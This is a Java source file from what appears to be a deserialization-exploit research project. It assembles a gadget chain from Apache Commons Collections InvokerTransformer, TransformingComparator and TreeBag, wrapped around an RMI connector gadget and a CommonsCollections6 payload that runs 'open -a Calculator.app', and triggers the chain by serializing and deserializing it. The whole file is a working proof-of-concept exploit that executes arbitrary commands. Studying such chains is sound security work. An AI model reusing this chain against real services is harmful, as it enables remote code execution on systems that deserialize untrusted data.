package xyz.eki.marshalexp.solution;

import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import xyz.eki.marshalexp.gadget.jdk.GRMIConnector;
import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.utils.SerializeUtils;
import sun.net.www.protocol.file.Handler;

public class PlayGround {
    public static void main(String[] args) throws Exception{
        final InvokerTransformer transformer = new InvokerTransformer("connect", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(GRMIConnector.invokeConnect2Deserialize(new CC6().getPocObject("open -a Calculator.app")));

        // arm transformer
        //ReflectUtils.setFieldValue(transformer, "iMethodName", "newTransformer");

        SerializeUtils.deserialize(SerializeUtils.serialize(tree));
    }
}
